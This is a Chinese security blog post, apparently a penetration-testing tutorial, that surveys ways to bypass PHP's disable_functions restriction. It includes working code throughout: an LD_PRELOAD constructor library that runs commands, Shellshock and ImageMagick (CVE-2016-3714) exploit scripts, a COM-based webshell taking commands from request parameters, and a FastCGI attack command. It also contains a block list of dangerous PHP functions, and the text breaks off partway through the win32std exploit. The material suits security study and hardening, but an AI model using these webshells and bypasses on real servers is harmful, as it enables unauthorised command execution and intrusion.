<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数"><meta name="keywords" content="PHP,disable_functions"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数 | J0k3r's Blog</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?9e8a6ba1f41c0d7b000fcfd73f1c7929";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-159554347-1', 'auto');
ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常用姿势"><span class="toc-number">1.</span> <span class="toc-text">0x01 常用姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-黑名单-bypass"><span class="toc-number">1.1.</span> <span class="toc-text">1. 黑名单 bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LD-PRELOAD-amp-putenv-bypass-disable-functions"><span class="toc-number">1.2.</span> <span class="toc-text">2. LD_PRELOAD &amp; putenv() bypass disable_functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ImageMagick-bypass-disable-functions"><span class="toc-number">1.3.</span> <span class="toc-text">3. ImageMagick bypass disable_functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-PHP-5-x-Shellshock-Exploit-bypass-disable-functions"><span class="toc-number">1.4.</span> <span class="toc-text">4. PHP 5.x Shellshock Exploit (bypass disable_functions)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-PHP-FPM-FastCGI-bypass-disable-functions"><span class="toc-number">1.5.</span> <span class="toc-text">5. PHP-FPM/FastCGI bypass disable_functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Windows-系统组件-COM"><span class="toc-number">1.6.</span> <span class="toc-text">6. Windows 系统组件 COM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions"><span class="toc-number">1.7.</span> <span class="toc-text">7. PHP 5.2.3 win32std extension safe_mode and bypass disable_functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-FFI-绕过-disable-functions"><span class="toc-number">1.8.</span> <span class="toc-text">8. FFI 绕过 disable_functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-Apache-mod-cgi-修改-htaccess-绕过限制"><span class="toc-number">1.9.</span> <span class="toc-text">9. Apache mod_cgi 修改 .htaccess 绕过限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-利用-PHP-bug-Bypass-disable-functions"><span class="toc-number">1.10.</span> <span class="toc-text">10. 利用 PHP bug Bypass disable_functions</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Use-after-free-with-json-serializer"><span class="toc-number">1.10.1.</span> <span class="toc-text">(1) Use after free with json serializer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Use-After-Free-in-GC-with-Certain-Destructors"><span class="toc-number">1.10.2.</span> <span class="toc-text">(2) Use After Free in GC with Certain Destructors</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-PHP-imap-open-RCE-漏洞-（CVE-2018-19518）"><span class="toc-number">1.11.</span> <span class="toc-text">11. PHP imap_open RCE 漏洞 （CVE-2018-19518）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一些利用工具"><span class="toc-number">1.12.</span> <span class="toc-text">一些利用工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Fuzz-挖掘含内部系统调用的函数"><span class="toc-number">2.</span> <span class="toc-text">0x02 Fuzz 挖掘含内部系统调用的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-OPcache-执行命令"><span class="toc-number">2.1.</span> <span class="toc-text">利用 OPcache 执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference："><span class="toc-number">3.</span> <span class="toc-text">Reference：</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center">求知若饥，虚心若愚</div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">40</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">38</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/links/">友链</a><a class="site-page" href="/about/">关于我</a></span></div><div id="post-info"><div id="post-title">PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-13</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>文章首发于安全客：<a href="https://www.anquanke.com/post/id/197745" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745</a></p>
<a id="more"></a>
<p>在渗透过程中，有很多 PHP 站点往往设置了disable_functions 来禁止用户调用某些危险函数，给 Getshell 带来了很大的不便，本文对一些常见的绕过方法的原理和使用稍做总结，顺便分享一个 Fuzz 方法，学习一下。</p>
<p>如有错误，欢迎师傅们指正</p>
<h2 id="0x01-常用姿势"><a href="#0x01-常用姿势" class="headerlink" title="0x01 常用姿势"></a>0x01 常用姿势</h2><h3 id="1-黑名单-bypass"><a href="#1-黑名单-bypass" class="headerlink" title="1. 黑名单 bypass"></a>1. 黑名单 bypass</h3><p>众所周知，disable_functions 是基于黑名单来实现对某些函数使用的限制的，既然是黑名单有时候就难免会有漏网之鱼</p>
<p>PHP 中能直接执行系统程序的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">shell_exec(）</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">dl() // 加载自定义 php 扩展</span><br></pre></td></tr></table></figure>
<p>PHP 中执行运算符（反引号）的效果和 shell_exec() 是相同的</p>
<p>一些比较严格的 disable_functions  限制项</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</span><br></pre></td></tr></table></figure>
<h3 id="2-LD-PRELOAD-amp-putenv-bypass-disable-functions"><a href="#2-LD-PRELOAD-amp-putenv-bypass-disable-functions" class="headerlink" title="2. LD_PRELOAD &amp; putenv() bypass disable_functions"></a>2. LD_PRELOAD &amp; putenv() bypass disable_functions</h3><p>Windows？</p>
<p>LD_PRELOAD 是一个 Unix 中比较特殊的环境变量，也产生过很多安全问题</p>
<p>简介</p>
<blockquote>
<p>​    LD_PRELOAD 是一个可选的 Unix 环境变量，包含一个或多个共享库或共享库的路径，加载程序将在包含 C 运行时库（libc.so）的任何其他共享库之前加载该路径。这称为预加载库。</p>
</blockquote>
<blockquote>
<p>​    也就是说它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。即我们可以自己生成一个动态链接库加载，以覆盖正常的函数库，也可以注入恶意程序，执行恶意命令。</p>
</blockquote>
<p>LD_PRELOAD 绕过 disable_functions 的原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令等敏感操作</p>
<p>举个例子，我们来改变一下 Linux 系统中最常见的命令 —— <code>id</code></p>
<p><code>strace -f id</code></p>
<p>使用 strace 对应用的系统调用和信号传递的跟踪结果来对应用进行分析，了解应用工作过程的</p>
<p>strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值，要在 Docker 中使用 strace 需要先关闭安全功能再启动 <code>docker run --security-opt seccomp:unconfined -d xxx</code></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis1.png" alt></p>
<p>像这种简单的无参系统函数就是比较好的劫持对象，</p>
<p><code>man 2 geteuid</code> 命令查看 geteuid 系统函数需要什么头文件和格式</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis2.png" alt></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uid_t</span> geteuid(<span class="keyword">void</span>)&#123;</span><br><span class="line">        system(<span class="string">"cat /etc/passwd"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成动态链接库</p>
<p><code>gcc --share -fPIC bad.c -o bad.so</code></p>
<p>使用 LD_PRELOAD 加载刚生成的 bad.so，再执行 <code>id</code> 命令看看效果</p>
<p><code>LD_PRELOAD=./bad.so id</code></p>
<p><strong>LD_PRELOAD 作为进程独占环境变量，它与待执行命令间必须为空白字符</strong></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis3.png" alt></p>
<p>成功执行的我们自定义的恶意代码，读取了 passwd 文件</p>
<p>通用动态链接库代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">j0k3r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"cmd"</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        system(getenv(<span class="string">"cmd"</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        system(<span class="string">"echo 'no cmd' &gt; /tmp/cmd.output"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    利用 GNU C 中的特殊语法 <code>__attribute__ ((attribute-list))</code>，当参数为 constructor 时就可以在加载共享库时运行，通常是在程序启动过程中，因为带有”构造函数”属性的函数将在 main() 函数之前被执行，类似的，若是换成 destructor 参数，则该函数会在 main() 函数执行之后或者 exit() 被调用后被自动执行</p>
<p>也就是说在 PHP 运行过程中只要有新程序启动，在我们加载恶意动态链接库的条件下，便可以执行 .so 中的恶意代码</p>
<p>比如 PHP 中经典的 mail() 函数，看看当 PHP 执行 mail() 函数的时候有没有执行程序或者启动新进程</p>
<p><code>strace -f php -r &quot;mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);&quot; 2&gt;&amp;1 | grep -E &quot;execve|fork|vfork&quot;</code></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis5.png" alt></p>
<p>​    可以明显发现 mai() 函数使用 execve 启动了 sendmail，接着可以使用 readelf -Ws 或者 strace 命令查看 sendmail 程序的系统函数调用情况</p>
<p>在 PHP 中使用 putenv() 函数设置环境变量, 仅存活于当前请求期间。在请求结束时环境会恢复到初始状态</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"cmd=cat /etc/passwd"</span>);</span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./bad.so"</span>);</span><br><span class="line">mail(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>);</span><br></pre></td></tr></table></figure>
<p>运行该 PHP 文件即可成功执行命令，就算没有安装 sendmail 也能成功利用</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis6.png" alt></p>
<p>如果 mail() 函数无法使用，也可以使用 <code>error_log(&#39;&#39;,1)</code> 或者 <code>mb_send_mail(&#39;&#39;,&#39;&#39;,&#39;&#39;)</code> 和 <code>imap_mail(&quot;1@a.com&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;)</code>（如果 PHP 开启了 imap 模块）</p>
<p>如果 PHP 安装了 imagick 模块，则还可以使用 Imagick，其在遇到 MPEG format 的时候，会调用 ffmpeg 进程来处理，比如使用 <code>new Imagick(&#39;1.mp4&#39;)</code> </p>
<p>文章后面有一部分关于确定这类使用 execve 系统调用的 php 函数的 Fuzz 方法</p>
<h3 id="3-ImageMagick-bypass-disable-functions"><a href="#3-ImageMagick-bypass-disable-functions" class="headerlink" title="3. ImageMagick bypass disable_functions"></a>3. ImageMagick bypass disable_functions</h3><p>利用 ImageMagick 命令执行漏洞（CVE-2016–3714）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Disable Functions: "</span> . ini_get(<span class="string">'disable_functions'</span>) . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AAAA</span><span class="params">()</span></span>&#123;</span><br><span class="line">$command = <span class="string">'curl 127.0.0.1:7777'</span>;</span><br><span class="line"></span><br><span class="line">$exploit = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill 'url(https://example.com/image.jpg"|<span class="subst">$command</span>")'</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">"KKKK.mvg"</span>, $exploit);</span><br><span class="line">$thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">$thumb-&gt;readImage(<span class="string">'KKKK.mvg'</span>);</span><br><span class="line">$thumb-&gt;writeImage(<span class="string">'KKKK.png'</span>);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(<span class="string">"KKKK.mvg"</span>);</span><br><span class="line">unlink(<span class="string">"KKKK.png"</span>);</span><br><span class="line">&#125;</span><br><span class="line">AAAA();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>复现环境 <a href="https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1</a></p>
<h3 id="4-PHP-5-x-Shellshock-Exploit-bypass-disable-functions"><a href="#4-PHP-5-x-Shellshock-Exploit-bypass-disable-functions" class="headerlink" title="4. PHP 5.x Shellshock Exploit (bypass disable_functions)"></a>4. PHP 5.x Shellshock Exploit (bypass disable_functions)</h3><p>PHP &lt; 5.6.2 - ‘Shellshock’ Safe Mode / Disable Functions Bypass / Command Injection</p>
<p>exploit-db 上的脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)</span></span><br><span class="line"><span class="comment"># Google Dork: none</span></span><br><span class="line"><span class="comment"># Date: 10/31/2014</span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net</span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror</span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2)</span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6</span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271</span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"Disabled functions: "</span>.ini_get(<span class="string">'disable_functions'</span>).<span class="string">"\n"</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span><span class="params">($cmd)</span> </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @ mail.c:283</span></span><br><span class="line">   <span class="keyword">if</span>(strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>) != <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">     $tmp = tempnam(<span class="string">"."</span>,<span class="string">"data"</span>);</span><br><span class="line">     putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">     <span class="comment">// In Safe Mode, the user may only alter environment variables whose names</span></span><br><span class="line">     <span class="comment">// begin with the prefixes supplied by this directive.</span></span><br><span class="line">     <span class="comment">// By default, users will only be able to set environment variables that</span></span><br><span class="line">     <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive is empty,</span></span><br><span class="line">     <span class="comment">// PHP will let the user modify ANY environment variable!</span></span><br><span class="line">     mail(<span class="string">"a@127.0.0.1"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">"-bv"</span>); <span class="comment">// -bv so we don't actually send any mail</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"Not vuln (not bash)"</span>;</span><br><span class="line">   $output = @file_get_contents($tmp);</span><br><span class="line">   @unlink($tmp);</span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">""</span>) <span class="keyword">return</span> $output;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"No output, or not vuln."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="5-PHP-FPM-FastCGI-bypass-disable-functions"><a href="#5-PHP-FPM-FastCGI-bypass-disable-functions" class="headerlink" title="5. PHP-FPM/FastCGI bypass disable_functions"></a>5. PHP-FPM/FastCGI bypass disable_functions</h3><p>​    大家都知道。Web Server 只是负责分发数据，那如果 Nginx 遇到 php 动态请求该怎么处理，这时就需要了解 PHP-FPM 和 FastCGI 了</p>
<p>​    FastCGI 是用于将交互式程序与 Web 服务器接口的二进制协议。FastCGI 是早期的通用网关接口（CGI）的变体。FastCGI 的主要目的是减少与Web服务器和 CGI 程序接口相关的开销，从而使服务器可以一次处理更多的网页请求。</p>
<p>​    PHP-FPM（ FastCGI 进程管理器）是另一种 PHP FastCGI 实现，具有一些其他功能，可用于各种规模的站点，尤其是繁忙的站点。PHP-FPM 也是用于调度管理 PHP 解析器php-cgi 的管理程序，php-cgi 作为 PHP 自带的解释器，只是个 CGI 程序，除了解析请求返回结果之外，并不能管理进程，也就无法做到修改 php.ini 配置文件后平滑重启</p>
<p>​    即 FastCGI 是 CGI 协议的升级版，用于封装 webserver 发送给 php 解释器的数据，通过 PHP-FPM 程序按照 FastCGI 协议进行处理和解析数据，返回结果给 webserver</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis7.png" alt></p>
<p>​    PHP5.3 版本之后，PHP-FPM 是内置于 PHP 的，一般来说，尤其是在高并发的情况下，nginx + PHP-FPM 的组合要比 apache + mod_php 好很多</p>
<p>那么伪造请求发送给 PHP-FPM 不就可以任意代码执行</p>
<p>脚本：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<p>本地测试</p>
<p><code>python fpm.py -c &#39;&lt;?php echo `id`;exit;?&gt;&#39; -p 9999 127.0.0.1 /var/www/html/test.php</code></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis8.png" alt></p>
<h3 id="6-Windows-系统组件-COM"><a href="#6-Windows-系统组件-COM" class="headerlink" title="6. Windows 系统组件 COM"></a>6. Windows 系统组件 COM</h3><p>​    COM（Component Object Model）组件对象模型，是一种跨应用和语言共享二进制代码的方法。COM 可以作为 DLL 被本机程序载入也可以通过 DCOM 被远程进程调用</p>
<p><code>C:\Windows\System32</code> 下的 wshom.ocx 能够提供 WshShell 对象和 WshNetwork 对象接口的访问，也就是提供对本地 Windows shell 和计算机所连接的网络上共享资源的访问</p>
<p>php.ini 中开启 <code>com.allow_dcom</code></p>
<p><code>com.allow_dcom = true</code></p>
<p>因为是在 Windows，如果在拓展文件夹 php/ext/ 中存在 php_com_dotnet.dll</p>
<p>到 php.ini 中开启拓展</p>
<p><code>extension=php_com_dotnet.dll</code></p>
<p>重启服务在 phpinfo 中就能看到开启了 com_dotnet</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Create Wscript.Shell Failed!"</span>);</span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c"</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用上面的 PHP 代码通过 COM 对象的 exec() 方法即可绕过 disable_functions 执行命令</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis9.png" alt></p>
<h3 id="7-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions"><a href="#7-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions" class="headerlink" title="7. PHP 5.2.3 win32std extension safe_mode and bypass disable_functions"></a>7. PHP 5.2.3 win32std extension safe_mode and bypass disable_functions</h3><p>这个貌似比较古老了 <a href="https://www.exploit-db.com/exploits/4218" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/4218</a></p>
<p>exploit-db 上的 exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//author: shinnai</span></span><br><span class="line"><span class="comment">//mail: shinnai[at]autistici[dot]org</span></span><br><span class="line"><span class="comment">//site: http://shinnai.altervista.org</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tested on xp Pro sp2 full patched, worked both from the cli and on apache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Thanks to rgod for all his precious advises :)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//I set php.ini in this way:</span></span><br><span class="line"><span class="comment">//safe_mode = On</span></span><br><span class="line"><span class="comment">//disable_functions = system</span></span><br><span class="line"><span class="comment">//if you launch the exploit from the cli, cmd.exe will be 